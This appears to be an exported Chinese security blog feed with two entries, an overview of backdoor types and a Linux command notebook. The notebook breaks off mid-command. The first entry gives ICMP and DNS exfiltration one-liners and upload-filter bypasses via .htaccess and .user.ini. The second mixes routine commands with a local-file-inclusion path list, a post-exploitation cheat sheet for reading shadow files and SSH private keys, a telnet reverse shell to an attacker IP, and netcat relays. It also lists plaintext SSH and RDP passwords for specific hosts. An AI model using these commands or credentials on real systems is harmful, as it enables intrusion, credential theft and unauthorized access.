攻击者和被控段以同样的算法和种子算出一系列域名，种子的约定可以是日期，可以是天气等。攻击者注册其中的一个或多个域名。这样的好处是反汇编难度大，算法不易被破解。即使被破解了，安全人员还需抢在攻击者之前及时注册生成的大量域名，费时费钱费力。 更多详细的可参考《C&amp;C控制服务的设计和侦测方法综述》 irc型irc的木马优点很多，比如管理方便，便于远控协调分工，channel隐藏，追溯难。缺点很明显，国内只有较少的用户使用irc，用户防火墙可能会拦截该流量，具体情况根据地区而定。关于这部分irc木马的中文实例资料可参考 icmp型ICMP通信协议中可看到在最后空余了很大的data段，名为数据缓冲区，可填充60000多字节。因此，可将被控端得到的数据放入其中： 1234$cmd = ls;$timeout = 1000;$server_ip = 'xxxx';(New-Object System.Net.NetworkInformation.Ping).Send($server_ip, $timeout, $cmd) 在server_ip上抓包可看到返回结果。 dns型DNS原理在这不过多展开，这种类型的逃逸方法一般是用自己申请的域名，将NS记录指向搭建的NS服务器上，使用DNS泛解析，把用户所查询关于该域名的信息记录下来。 1$ ping -c 2 `whoami`.xxxx.ceye.io 1$ nslookup -querytype=txt $data.ns.lynahex.com 8.8.8.8 不过使用如上的常规方法，似乎会对data长度有限制。自建NS服务器的源码可看NoEye（题外话：有的厂商从数据库中查询指定域名的txt记录时并未过滤，可能会有sql注入。:-D。） 该类流行的木马可参考dnscat2,它涉及了更底层的包构造，即使没有域名，也可使用该协议进行通信。 具体用法 总的来说，这类后门依赖于上层协议，符合人们常用协议的范围，同时，攻击者也在探寻新兴的协议来exfiltrate。 网站类传统的后门中自然少不了该类型，从用户发出数据请求开始到最终落入网站的数据库中，经过服务端的每一环节都有可能成为攻击者利用的地方。 模块扩展型中间件之所以能被利用，是因为它们的可扩展性，当布置完模块或插件时，中间件无法判断开发者的行为是否为恶意。 apache将后门增加到apache模块目录中，攻击者只需要简单地发起一个请求就可拿到root权限的shell，并且没有任何日志记录。最出名的莫过于mod_rootme 具体操作可参考 ginxnginx占有内存少，并发能力强，受到很多用户的喜爱。它可很方便地添加和升级模块，同理，pwnginx作为经典的后门也是应用了该原理，程序员只需将正常的功能稍微改动，就能达到另一面的效果。 iisiis后门是用了iis本身的机制，当在http头里增加一字段即可触发后门，并执行发过来的命令。具体原理和操作可参考中间件的后门大多是以类似上述原理为基础的。 PHP扩展库同理，将编译好的so文件添加到php.ini的extension中。当模块被初始化时，会去加载执行我们的代码。当发送特定参数的字符串过去时，即可触发后门。 后端语言型这类后门在新型框架和语言的兴起下，影响力有些稍稍减弱。主要原因是现主流框架都采取路由的方式来映射url，有时攻击者即使上传完后门，也有可能无法找到对应的路由映射方式。站在不同人群的角度来看后门也别有一番风情。下面分为开发者后门和攻击者使用的后门，其中针对攻击者的后门是以PHP为例。 开发者后门有时开发者也会在代码中留下后门，比如x博CMS。它通常是一些奇怪的代码，稍微动态调试下可分析出后门，这是属于比较低级的，更高级的的后门是逻辑和理论相关的漏洞，在defcon23上进行的“卑鄙密码竞赛”，曾经wooyun有介绍，有的参赛者将密码学的知识和PHP特性相结合，并以一定的逻辑性代码迷惑大多数人。虽然不难，但能想出这点子实在难能可贵。更为有趣的是，即使被发现了也可当作是个漏洞处理，舆论不会偏向于说这是开发者留下的后门。 另外一方面，后门不一定直接出现在产品中，可能也会存在库中或编译好的文件里，比如nodesjs仓库或pyc后门。 PHP后门随着时代的变迁，木马的重心也随着转移。前10年里，PHP马看重的是功能，而如今则是免杀以及绕waf的能力，具体来说，指的是木马静态文件的免杀和通信流量的无特征。 在实战中，主要采取的方法为混淆编码、字符替换等，还可利用解释性语言的特性以及其回调机制。对于通信流量方面，一般采取对称加密，如DES，而不是编码等。比较成熟的后门是weevely，也可根据需求将菜刀完善，把流量加密。 配置文件型该类型后门主要是通过阅读相关官方文档来挖掘发现，主要应用场景是bypass上传文件的黑名单。以PHP语言为例： .htaccess后门在.htaccess中添加php解析的新后缀并上传，之后上传该后缀的木马即可。 1AddType application/x-httpd-php .abc .user.ini后门.user.ini相当于用户自定义的php.ini。 上传.user.ini，其中的内容为： 1auto_prepend_file=xx.gif 可以让该目录下的所有php文件自动包含xx.gif，我们直接上传xx.gif作为木马。不过较大的限制是该目录下必须要有正常的php文件才能使得xx.gif中的代码执行。 总结当然，上面的这些都是大牛们总结的，我只是个搬运工。]]></content>
      <categories>
        <category>backdoor</category>
      </categories>
      <tags>
        <tag>backdoor</tag>
        <tag>linux</tag>
        <tag>windows</tag>
        <tag>iot</tag>
        <tag>protocol</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 基础知识]]></title>
    <url>%2F2016%2F12%2F22%2Flinux-base%2F</url>
    <content type="text"><![CDATA[概述记录一下Linux的常用命令，方便查询。 持续更新中。 目录基本目录12345678910111213141516171819202122232425262728/var (variable)：与系统运作过程有关。/var/log/ 日志/dev 驱动 比要重要的档案有/dev/null, /dev/zero, /dev/tty, /dev/lp*, /dev/hd*, /dev/sd*等等/usr (软件放置处)/usr/local 系统管理员在本机自行安装自己下载的软件/usr/share/doc 说明文件档/opt (第三方协力软件)/etc (配置文件) /etc/init.d/：所有朋务的预设启动 script 都是放在这里的。 例如要启动或者关闭 iptables 的话：『 /etc/init.d/iptables start』、『/etc/init.d/iptables stop』/boot (开机与核心档) Linux kernel常用的档名为：vmlinuz，如果使用的是grub这个开机管理程序， 则还会存在/boot/grub/这个目录喔！/bin 系统有很多放置执行文件的目录，但/bin比较特殊。 因为/bin放置的是在单人维护模式下还能够被操作的指令。在/bin底下的指令可以被root不一般账号所使用，主要有：cat, chmod, chown, date, mv, mkdir, cp, bash等等常用的指令。/home 这是系统默认的用户家目录(home directory)。/lib 系统的函式库/media 可移除的装置啦！ 包括软盘、光盘、DVD等等装置都暂时挂载在这。/mnt 如果你想要暂时挂载某些额外的装置，一般建议你可以放置到这个目录中。/srv 是一些网络朋务启动后，这些服务所需要取用的数据目录。/tmp 暂时放置档案的地方。/lost+found 这个目录是使用标准的ext2/ext3文件系统格式才会产生的一个目录，目的在二当文件系统发生错误时， 将一些遗失的片段放置到这个目录下。这个目录通常会在分割槽的最顶层存在， 例如你加装一颗硬盘于/disk中，那在这个系统下就会自动产生一个这样的目录『/disk/lost+found』/proc 他放置的数据都是在内存当中， 例如系统核心、行程信息(process)、周边装置的状态及网络状态等等。因为这个目录下的数据都是在内存当中， 所以本身不占任何硬盘空间啊！比较重要的档案例如：/proc/cpuinfo, /proc/dma, /proc/interrupts, /proc/ioports, / proc/net/* 等等。/sys 这个目录其实跟/proc非常类似，也是一个虚拟的文件系统，主要也是记录不核心相关的信息。 包括目前已加载的核心模块不核心侦测到的硬件装置信息等等。这个目录同样不占硬盘容量喔！/sbin 重要的系统执行文件 常见路径Linux 系统下的一些常见路径： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147/etc/passwd/etc/shadow/etc/fstab/etc/host.conf/etc/motd/etc/ld.so.conf/var/www/htdocs/index.php/var/www/conf/httpd.conf/var/www/htdocs/index.html/var/httpd/conf/php.ini/var/httpd/htdocs/index.php/var/httpd/conf/httpd.conf/var/httpd/htdocs/index.html/var/httpd/conf/php.ini/var/www/index.html/var/www/index.php/opt/www/conf/httpd.conf/opt/www/htdocs/index.php/opt/www/htdocs/index.html/usr/local/apache/htdocs/index.html/usr/local/apache/htdocs/index.php/usr/local/apache2/htdocs/index.html/usr/local/apache2/htdocs/index.php/usr/local/httpd2.2/htdocs/index.php/usr/local/httpd2.2/htdocs/index.html/tmp/apache/htdocs/index.html/tmp/apache/htdocs/index.php/etc/httpd/htdocs/index.php/etc/httpd/conf/httpd.conf/etc/httpd/htdocs/index.html/www/php/php.ini/www/php4/php.ini/www/php5/php.ini/www/conf/httpd.conf/www/htdocs/index.php/www/htdocs/index.html/usr/local/httpd/conf/httpd.conf/apache/apache/conf/httpd.conf/apache/apache2/conf/httpd.conf/etc/apache/apache.conf/etc/apache2/apache.conf/etc/apache/httpd.conf/etc/apache2/httpd.conf/etc/apache2/vhosts.d/00_default_vhost.conf/etc/apache2/sites-available/default/etc/phpmyadmin/config.inc.php/etc/mysql/my.cnf/etc/httpd/conf.d/php.conf/etc/httpd/conf.d/httpd.conf/etc/httpd/logs/error_log/etc/httpd/logs/error.log/etc/httpd/logs/access_log/etc/httpd/logs/access.log/home/apache/conf/httpd.conf/home/apache2/conf/httpd.conf/var/log/apache/error_log/var/log/apache/error.log/var/log/apache/access_log/var/log/apache/access.log/var/log/apache2/error_log/var/log/apache2/error.log/var/log/apache2/access_log/var/log/apache2/access.log/var/www/logs/error_log/var/www/logs/error.log/var/www/logs/access_log/var/www/logs/access.log/usr/local/apache/logs/error_log/usr/local/apache/logs/error.log/usr/local/apache/logs/access_log/usr/local/apache/logs/access.log/var/log/error_log/var/log/error.log/var/log/access_log/var/log/access.log/usr/local/apache/logs/access_logaccess_log.old/usr/local/apache/logs/error_logerror_log.old/etc/php.ini/bin/php.ini/etc/init.d/httpd/etc/init.d/mysql/etc/httpd/php.ini/usr/lib/php.ini/usr/lib/php/php.ini/usr/local/etc/php.ini/usr/local/lib/php.ini/usr/local/php/lib/php.ini/usr/local/php4/lib/php.ini/usr/local/php4/php.ini/usr/local/php4/lib/php.ini/usr/local/php5/lib/php.ini/usr/local/php5/etc/php.ini/usr/local/php5/php5.ini/usr/local/apache/conf/php.ini/usr/local/apache/conf/httpd.conf/usr/local/apache2/conf/httpd.conf/usr/local/apache2/conf/php.ini/etc/php4.4/fcgi/php.ini/etc/php4/apache/php.ini/etc/php4/apache2/php.ini/etc/php5/apache/php.ini/etc/php5/apache2/php.ini/etc/php/php.ini/etc/php/php4/php.ini/etc/php/apache/php.ini/etc/php/apache2/php.ini/web/conf/php.ini/usr/local/Zend/etc/php.ini/opt/xampp/etc/php.ini/var/local/www/conf/php.ini/var/local/www/conf/httpd.conf/etc/php/cgi/php.ini/etc/php4/cgi/php.ini/etc/php5/cgi/php.ini/php5/php.ini/php4/php.ini/php/php.ini/PHP/php.ini/apache/php/php.ini/xampp/apache/bin/php.ini/xampp/apache/conf/httpd.conf/NetServer/bin/stable/apache/php.ini/home2/bin/stable/apache/php.ini/home/bin/stable/apache/php.ini/var/log/mysql/mysql-bin.log/var/log/mysql.log/var/log/mysqlderror.log/var/log/mysql/mysql.log/var/log/mysql/mysql-slow.log/var/mysql.log/var/lib/mysql/my.cnf/usr/local/mysql/my.cnf/usr/local/mysql/bin/mysql/etc/mysql/my.cnf/etc/my.cnf/usr/local/cpanel/logs/usr/local/cpanel/logs/stats_log/usr/local/cpanel/logs/access_log/usr/local/cpanel/logs/error_log/usr/local/cpanel/logs/license_log/usr/local/cpanel/logs/login_log/usr/local/cpanel/logs/stats_log/usr/local/share/examples/php4/php.ini/usr/local/share/examples/php/php.ini/usr/local/tomcat5527/bin/version.sh/usr/share/tomcat6/bin/startup.sh/usr/tomcat6/bin/startup.sh 开机流程简单的说，整个开机流程到操作系统之前的动作应该是这样的： BIOS：开机主动执行的韧体，会认识第一个可开机的装置； MBR：第一个可开机装置的第一个扇区内的主要启动记录区块，内吨开机管理程序； 开机管理程序(boot loader)：一支可读叏核心档案来执行的软件； 核心档案：开始操作系统的功能… 文件属性123456789101112drwxr-xr-x 16 root root 4096 Aug 6 22:01 ImageMagick[ 权限 ] [连结] [拥有者] [群组][档案容量] [ 修改日期 ] [ 文件名 ] d rwx r-x r-x[ 文件类型 ] [ 文件拥有者 ] [ 文件所属组 ] [ 其他人权限 ]第一个字符代表这个档案是『目录、档案或链接文件等等』：* 当为[ d ]则是目录，例如上表档名为『.gconf』的那一行；* 当为[ - ]则是档案，例如上表档名为『install.log』那一行；* 若是[ l ]则表示为连结档(link file)；* 若是[ b ]则表示为装置文件里面的可供储存的接口讴备(可随机存取装置)；* 若是[ c ]则表示为装置文件里面的串行端口讴备，例如键盘、鼠标(一次性读取装置)。 权限对目录的重要性可读表示具有读取目录结构列表的权限，所以当你具有读取(r)一个目录的权限时，表示你可以查询该目录下的文件名数据。 所以你就可以利用 ls 这个指令将该目录的内容列表显示出来！ 可写这个可写入的权限对目录来说，是很里不起起的！ 因为他表示你具有移动该目录结构列表的权限，也就是底下这些权限： 建立新的档案与目录； 删除已经存在的档案与目录(不论该档案的权限为何！) 将已存在的档案或目录进行更名； 搬移该目录内的档案、目录位置。总之，目录的w权限就与该目录底下的文件名异动有关就对了啦！ 执行目录只是记录文件名而已，总不能拿来执行吧？没错！目录不可以被执行，目录的x代表的是用户能否迚入该目录成为工作目录的用途！所谓的工作目录(work directory)就是你目前所在的目录啦！举例来说，当你登入Linux时， 你所在的家目录就是你当下的工作目录。而变换目录的命令是『cd』(change directory)啰！ 工作目录对于指令的执行是非常重要的，如果你在某目录下不具有x的权限， 那么你就无法切换到该目录下，也就无法执行该目录下的任何指令，即使你具有该目录的r的权限。 文件名限制在Linux底下，使用预设的Ext2/Ext3文件系统时，针对档案的档名长度限制为： 单一档案或目录的最大容许文件名为 255 个字符； 包函完整路径名称及目录 (/) 的完整档名为 4096 个字符。以及避免一些特殊字符比较好！例如底下这些：1* ? &gt; &lt; ; &amp; ! [ ] | \ &apos; &quot; ` ( ) &#123; &#125; 常用指令基础指令123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960date 显示日期cal 显示日历bc 计算器[Ctrl]-c 中断目前程序[Ctrl]-d 取代exit的输入info 指令说明man 指令说明whatis 指令说明shutdown 关机reboot 重启halt 重启poweroff 重启init 系统运作的模式 init 0 关机chgrp 改变档案所属群组chown 改变档案拥有者chmod 改变档案的权限, SUID, SGID, SBIT等等的特权cd 变换目录pwd 显示弼前目录mkdir 建立一个新的目录rmdir 删除一个空的目录cp (复制档案或目录)rm (移除档案或目录)mv (移动档案与目录，或更名)cat 由第一行开始显示档案内容tac 从最后一行开始显示，可以看出 tac 是 cat 的倒着写！nl 显示的时候，顺道输出行号！more 一页一页的显示档案内容less 不 more 类似，但是比 more 更好的是，他可以往前翻页！head 叧看头几行tail 叧看尾巳几行od 以二迚制的方式读取档案内容！touch 修改档案时间或建置新档umask 档案预设权限chattr (配置文件案隐藏属性) lsattr (显示档案隐藏属性) file 观察文件类型which (寻找『执行档』)whereis (寻找特定档案)locate 这是因为 locate 寻找的数据是由『已建立的数据库 /var/lib/mlocate/』 里面大的数据所搜寻到的，所以不用直接在去硬盘弼中存取数据find 不过由亍 find 在寻找数据得时后相当的操硬盘tar 压 缩：tar -jcv -f filename.tar.bz2 要被压缩的档案或目录名称 查 询：tar -jtv -f filename.tar.bz2 解压缩：tar -jxv -f filename.tar.bz2 -C 欲解压缩的目录type Bash shell 的内建命令grep 搜索指定字符串kill 杀死进程 ps 将某个时间点的程序运作情况撷取下来top 动态观察程序的变化pstree 查到程序相关性free 观察内存使用情况uname 查阅系统与核心相关信息uptime 观察系统启动时间与工作负载netstat 追踪网络或插槽文件vmstat 侦测系统资源变化lsof 列出被程序所开启的档案文件名pidof ：找出某支正在执行的程序的 PID 常用指令系统管理 fdisk fdisk -l 查看系统分区信息 fdisk fdisk /dev/sdb 为一块新的SCSI硬盘进行分区 chown chown root /home 把/home的属主改成root用户 chgrp chgrp root /home 把/home的属组改成root组 useradd 创建一个新的用户 groupadd 组名 创建一个新的组 passwd 用户名 为用户创建密码 passwd -d用户名 删除用户密码也能登陆 passwd -S用户名 查询账号密码 usermod -l 新用户名 老用户名 为用户改名 userdel–r 用户名 删除用户一切 service [servicename] start/stop/restart 系统服务控制操作 /etc/init.d/[servicename] start/stop/restart 系统服务控制操作# xshell上传下载： sudo apt-get instal lrzsz 上传：rz -E 下载：sz# ssh 22： sudo apt-get install openssh-server 开启：sudo /etc/init.d/ssh restart# mysql开启远程连接： mysql -u root -p use mysql GRANT ALL PRIVILEGES ON *.* TO &apos;root&apos;@&apos;%&apos; IDENTIFIED BY &apos;123456&apos; WITH GRANT OPTION; flush privileges;# find 命令： find .|xargs grep -ri &quot;IBM&quot; 查找目录下的所有文件中是否含有某个字符串,并且只打印出文件名 find /opt/ -name &quot;MyCProgram.c&quot; 用文件名查找文件 find /opt/ -iname &quot;MyCProgram.c&quot; 用文件名查找文件，忽略大小写 find /opt/ -maxdepth 3 -iname &quot;passwd&quot; 在opt目录下及其最大三层深度的子目录中查找passwd文件 find /opt/ -maxdepth 3 -iname &quot;SBLF.php&quot; -exec cat &#123;&#125; \ 查找文件并查看 find /opt/ -not -iname &quot;MyCProgram.c&quot; 相反匹配 find /opt/ -perm 755 -type f -exec ls -l &#123;&#125; \; 查找opt目录下755权限的文件并执行ls -l find /opt/ -empty 查找所有的空文件 find /opt/lampp/htdocs/ -newer /opt/lampp/htdocs/Trojan/lqx.php 查找在指定文件时间之后做了修改的文件# 远程链接 1).linux ssh ubuntu@115.159.50.234 密码:8KX3OuQkBhDRvE7 2).windows rdesktop 115.159.100.36 -u Administrator -p 3GCGc7OoRn0kpMY7# 设置软连接 ln -s /usr/local/nginx/logs/access.log nginx_access.log# make编译 make 编译 make install 安装编译好的源码包# apt命令 apt-cache search package 搜索包 apt-cache show package 获取包的相关信息，如说明、大小、版本等 sudo apt-get install package 安装包 sudo apt-get install package - - reinstall 重新安装包 sudo apt-get -f install 修复安装”-f = –fix-missing” sudo apt-get remove package 删除包 sudo apt-get remove package - - purge 删除包，包括删除配置文件等 sudo apt-get update 更新源 sudo apt-get upgrade 更新已安装的包 sudo apt-get dist-upgrade 升级系统 sudo apt-get dselect-upgrade 使用 dselect 升级 apt-cache depends package 了解使用依赖 apt-cache rdepends package 是查看该包被哪些包依赖 sudo apt-get build-dep package 安装相关的编译环境 apt-get source package 下载该包的源代码 sudo apt-get clean &amp;&amp; sudo apt-get autoclean 清理无用的包 sudo apt-get check 检查是否有损坏的依赖 sudo apt-get clean 清理所有软件缓存（即缓存在/var/cache/apt/archives目录里的deb包） sudo apt-get autoremove 删除系统不再使用的孤立软件 apt-get -qq –print-uris install ssh | cut -d\’ -f2 查看包在服务器上面的地址# 清除所以删除包的残余配置文件 dpkg -l |grep ^rc|awk ‘&#123;print $2&#125;’ |tr [&quot;\n&quot;] [&quot; “]|sudo xargs dpkg -P -# 查看安装软件时下载包的临时存放目录 ls /var/cache/apt/archives# 备份当前系统安装的所有包的列表 dpkg –get-selections | grep -v deinstall &gt; ~/somefile# 从上面备份的安装包的列表文件恢复所有包 dpkg –set-selections &lt; ~/somefile sudo dselect# 查看内核 uname -a# 查看Ubuntu版本 cat /etc/issue# 查看内核加载的模块 lsmod# 查看PCI设备 lspci# 查看USB设备 lsusb# 查看网卡状态 sudo ethtool eth0# 查看CPU信息 cat /proc/cpuinfo# 显示当前硬件信息 lshw# 查看硬盘的分区 sudo fdisk -l# 查看IDE硬盘信息 sudo hdparm -i /dev/hda# 查看STAT硬盘信息 sudo hdparm -I /dev/sda sudo blktool /dev/sda id# 如果你想在当前目录下 查找&quot;hello,world!&quot;字符串,可以这样:grep -rn &quot;hello,world!&quot; ** : 表示当前目录所有文件，也可以是某个文件名-r 是递归查找-n 是显示行号-R 查找所有文件包含子目录-i 忽略大小写下面是一些有意思的命令行参数：grep -i pattern files ：不区分大小写地搜索。默认情况区分大小写，grep -l pattern files ：只列出匹配的文件名，grep -L pattern files ：列出不匹配的文件名，grep -w pattern files ：只匹配整个单词，而不是字符串的一部分（如匹配‘magic’，而不是‘magical’），grep -C number pattern files ：匹配的上下文分别显示[number]行，grep pattern1 | pattern2 files ：显示匹配 pattern1 或 pattern2 的行，grep pattern1 files | grep pattern2 ：显示既匹配 pattern1 又匹配 pattern2 的行。这里还有些用于搜索的特殊符号：\&lt; 和 \&gt; 分别标注单词的开始与结尾。例如：grep man * 会匹配 ‘Batman’、‘manic’、‘man’等，grep &apos;\&lt;man&apos; * 匹配‘manic’和‘man’，但不是‘Batman’，grep &apos;\&lt;man\&gt;&apos; 只匹配‘man’，而不是‘Batman’或‘manic’等其他的字符串。&apos;^&apos;：指匹配的字符串在行首，&apos;$&apos;：指匹配的字符串在行尾， xargs配合grep查找find -type f -name &apos;*.php&apos;|xargs grep &apos;GroupRecord&apos;``## 信息收集``` bash 系统是什么版本?cat /etc/issuecat /etc/*-releasecat /etc/lsb-releasecat /etc/redhat-release它的内核版本是什么？cat /proc/version uname -auname -mrsrpm -q kerneldmesg | grep Linuxls /boot | grep vmlinuz它的环境变量里有些什么？cat /etc/profilecat /etc/bashrccat ~/.bash_profilecat ~/.bashrccat ~/.bash_logoutenvset是否有台打印机？lpstat -a应用与服务查看进程打开的文件lsof -p正在运行什么服务？什么样的服务具有什么用户权限？ps auxps -eftopcat /etc/service哪些服务具有root的权限？这些服务里你看起来那些有漏洞,进行再次检查！ps aux | grep rootps -ef | grep root安装了哪些应用程序？他们是什么版本？哪些是当前正在运行的？ls -alh /usr/bin/ls -alh /sbin/dpkg -lrpm -qals -alh /var/cache/apt/archivesOls -alh /var/cache/yum/Service设置，有任何的错误配置吗？是否有任何（脆弱的）的插件？cat /etc/syslog.confcat /etc/chttp.confcat /etc/lighttpd.confcat /etc/cups/cupsd.confcat /etc/inetd.confcat /etc/apache2/apache2.confcat /etc/my.confcat /etc/httpd/conf/httpd.confcat /opt/lampp/etc/httpd.confls -aRl /etc/ | awk ‘$1 ~ /^.*r.*/主机上有哪些工作计划？crontab -lls -alh /var/spool/cronls -al /etc/ | grep cronls -al /etc/cron*cat /etc/cron*cat /etc/at.allowcat /etc/at.denycat /etc/cron.allowcat /etc/cron.denycat /etc/crontabcat /etc/anacrontabcat /var/spool/cron/crontabs/root主机上可能有哪些纯文本用户名和密码?grep -i user [filename]grep -i pass [filename]grep -C 5 &quot;password&quot; [filename]find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot; # Joomla通信与网络NIC(s)，系统有哪些？它是连接到哪一个网络？/sbin/ifconfig -acat /etc/network/interfacescat /etc/sysconfig/network网络配置设置是什么？网络中有什么样的服务器？DHCP服务器？DNS服务器？网关？cat /etc/resolv.confcat /etc/sysconfig/networkcat /etc/networksiptables -Lhostnamednsdomainname其他用户主机与系统的通信？lsof -ilsof -i :80grep 80 /etc/servicesnetstat -antupnetstat -antpxnetstat -tulpnchkconfig --listchkconfig --list | grep 3:onlastw缓存？IP和/或MAC地址?arp -eroute/sbin/route -nee数据包可能嗅探吗？可以看出什么？监听流量$ tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]$ tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.2.2.222 21你如何get一个shell？你如何与系统进行交互？# http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/nc -lvp 4444 # Attacker. 输入 (命令)nc -lvp 4445 # Attacker. 输出(结果)telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445 # 在目标系统上. 使用 攻击者的IP!如何端口转发？（端口重定向）# rinetd# http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch# fpipe# FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]FPipe.exe -l 80 -r 80 -s 80 192.168.1.7# ssh# ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]ssh -L 8080:127.0.0.1:80 root@192.168.1.7 # Local Portssh -R 8080:127.0.0.1:80 root@192.168.1.7 # Remote Port#mknod# mknod backpipe p ; nc -l -p [remote port] &lt; backpipe | nc [local IP] [local port] &gt;backpipemknod backpipe p ; nc -l -p 8080 &lt; backpipe | nc 10.1.1.251 80 &gt;backpipe # Port Relaymknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1&gt;backpipe # Proxy (Port 80 to 8080)mknodbackpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nclocalhost 80 | tee -a outflow &amp; 1&gt;backpipe # Proxy monitor (Port 80 to 8080)建立隧道可能吗？本地，远程发送命令ssh -D 127.0.0.1:9050 -N [username]@[ip]proxychains ifconfigmm信息和用户你是谁？哪个id登录？谁已经登录？还有谁在这里？谁可以做什么呢？idwhowlastcat /etc/passwd | cut -d: # List of usersgrep -v -E &quot;^#&quot; /etc/passwd | awk -F: &amp;#039;$3 == 0 &#123; print $1&#125;&apos; # List of super usersawk -F: &apos;($3 == &quot;0&quot;) &#123;print&#125;&amp;#039; /etc/passwd # List of super userscat /etc/sudoerssudo -l可以找到什么敏感文件？cat /etc/passwdcat /etc/groupcat /etc/shadowls -alh /var/mail/什么有趣的文件在home/directorie（S）里？如果有权限访问ls -ahlR /root/ls -ahlR /home/是否有任何密码，脚本，数据库，配置文件或日志文件？密码默认路径和位置cat /var/apache2/config.inccat /var/lib/mysql/mysql/user.MYDcat /root/anaconda-ks.cfg用户做过什么？是否有任何密码呢？他们有没有编辑什么？cat ~/.bash_historycat ~/.nano_historycat ~/.atftp_historycat ~/.mysql_historycat ~/.php_history可以找到什么样的用户信息cat ~/.bashrccat ~/.profilecat /var/mail/rootcat /var/spool/mail/rootprivate-key 信息能否被发现？cat ~/.ssh/authorized_keyscat ~/.ssh/identity.pubcat ~/.ssh/identitycat ~/.ssh/id_rsa.pubcat ~/.ssh/id_rsacat ~/.ssh/id_dsa.pubcat ~/.ssh/id_dsacat /etc/ssh/ssh_configcat /etc/ssh/sshd_configcat /etc/ssh/ssh_host_dsa_key.pubcat /etc/ssh/ssh_host_dsa_keycat /etc/ssh/ssh_host_rsa_key.pubcat /etc/ssh/ssh_host_rsa_keycat /etc/ssh/ssh_host_key.pubcat /etc/ssh/ssh_host_key文件系统哪些用户可以写配置文件在/ etc /？能够重新配置服务？ls -aRl /etc/ | awk ‘$1 ~ /^.*w.*/&apos; 2&gt;/dev/null # Anyonels -aRl /etc/ | awk ’$1 ~ /^..w/&apos; 2&gt;/dev/null # Ownerls -aRl /etc/ | awk ‘$1 ~ /^.....w/&apos; 2&gt;/dev/null # Groupls -aRl /etc/ | awk ’;$1 ~ /w.$/&apos; 2&gt;/dev/null # Otherfind /etc/ -readable -type f 2&gt;/dev/null # Anyonefind /etc/ -readable -type f -maxdepth 1 2&gt;/dev/null # Anyone在/ var /有什么可以发现？ls -alh /var/logls -alh /var/maills -alh /var/spoolls -alh /var/spool/lpdls -alh /var/lib/pgsqlls -alh /var/lib/mysqlcat /var/lib/dhcp3/dhclient.leases网站上的任何隐藏配置/文件?配置文件与数据库信息？ls -alhR /var/www/ls -alhR /srv/www/htdocs/ls -alhR /usr/local/www/apache22/data/ls -alhR /opt/lampp/htdocs/ls -alhR /var/www/html/有什么在日志文件里?（什么能够帮助到“本地文件包含”?)# http://www.thegeekstuff.com/2011/08/linux-var-log-files/cat /etc/httpd/logs/access_logcat /etc/httpd/logs/access.logcat /etc/httpd/logs/error_logcat /etc/httpd/logs/error.logcat /var/log/apache2/access_logcat /var/log/apache2/access.logcat /var/log/apache2/error_logcat /var/log/apache2/error.logcat /var/log/apache/access_logcat /var/log/apache/access.logcat /var/log/auth.logcat /var/log/chttp.logcat /var/log/cups/error_logcat /var/log/dpkg.logcat /var/log/faillogcat /var/log/httpd/access_logcat /var/log/httpd/access.logcat /var/log/httpd/error_logcat /var/log/httpd/error.logcat /var/log/lastlogcat /var/log/lighttpd/access.logcat /var/log/lighttpd/error.logcat /var/log/lighttpd/lighttpd.access.logcat /var/log/lighttpd/lighttpd.error.logcat /var/log/messagescat /var/log/securecat /var/log/syslogcat /var/log/wtmpcat /var/log/xferlogcat /var/log/yum.logcat /var/run/utmpcat /var/webmin/miniserv.logcat /var/www/logs/access_logcat /var/www/logs/access.logls -alh /var/lib/dhcp3/ls -alh /var/log/postgresql/ls -alh /var/log/proftpd/ls -alh /var/log/samba/#auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info,mail.log, mail.warn, messages, syslog, udev, wtmp(有什么文件?log.系统引导……)如果命令限制，你可以打出哪些突破它的限制？python -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;echo os.system(&apos;/bin/bash&apos;)/bin/sh -i如何安装文件系统？mountdf -h是否有挂载的文件系统？cat /etc/fstab什么是高级Linux文件权限使用？Sticky bits, SUID 和GUIDfind / -perm -1000 -type d 2&gt;/dev/null # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename herefind / -perm -g=s -type f 2&gt;/dev/null # SGID (chmod 2000) - run as the group, not the user who started it.find / -perm -u=s -type f 2&gt;/dev/null # SUID (chmod 4000) - run as the owner, not the user who started it.find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null # SGID or SUIDfor i in `locate -r &quot;bin$&quot;`; do find $i ( -perm -4000 -o -perm -2000 ) -type f 2&gt;/dev/null; done #Looks in &amp;#039;common&amp;#039; places: /bin, /sbin, /usr/bin, /usr/sbin,/usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID(Quicker search)#findstarting at root (/), SGIDorSUID, not Symbolic links, only 3folders deep, list with more detail and hideany errors (e.g. permissiondenied)find/-perm -g=s-o-perm -4000! -type l-maxdepth 3 -exec ls -ld &#123;&#125; ;2&gt;/dev/null在哪些目录可以写入和执行呢？几个“共同”的目录：/ tmp目录，/var / tmp目录/ dev /shm目录find / -writable -type d 2&gt;/dev/null # world-writeable foldersfind / -perm -222 -type d 2&gt;/dev/null # world-writeable foldersfind / -perm -o+w -type d 2&gt;/dev/null # world-writeable foldersfind / -perm -o+x -type d 2&gt;/dev/null # world-executable foldersfind / ( -perm -o+w -perm -o+x ) -type d 2&gt;/dev/null # world-writeable &amp; executable foldersAny &quot;problem&quot; files？可写的的，“没有使用&quot;的文件find / -xdev -type d ( -perm -0002 -a ! -perm -1000 ) -print # world-writeable filesfind /dir -xdev ( -nouser -o -nogroup ) -print # Noowner files准备和查找漏洞利用代码安装了什么开发工具/语言/支持？find / -name perl*find / -name 